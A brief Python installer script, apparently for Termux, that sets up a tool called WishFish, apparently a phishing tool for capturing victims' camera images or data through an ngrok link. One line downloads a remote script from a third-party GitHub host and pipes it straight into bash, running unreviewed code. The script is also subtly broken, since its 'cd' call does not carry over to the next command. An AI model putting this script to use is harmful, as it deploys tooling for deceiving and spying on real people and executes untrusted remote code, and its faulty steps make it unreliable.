import os

os.system("pkg install git -y")
os.system("pkg install php -y")
os.system("pkg install openssh")
os.system("git clone https://github.com/kinghacker0/WishFish")
os.system("pkg install wget -y")
os.system("wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok")
os.system("cd WishFish")
os.system("cp $PREFIX/bin/ngrok ~/WishFish")
os.system("bash wishfish.sh")
os.system("termux-setup-storage")
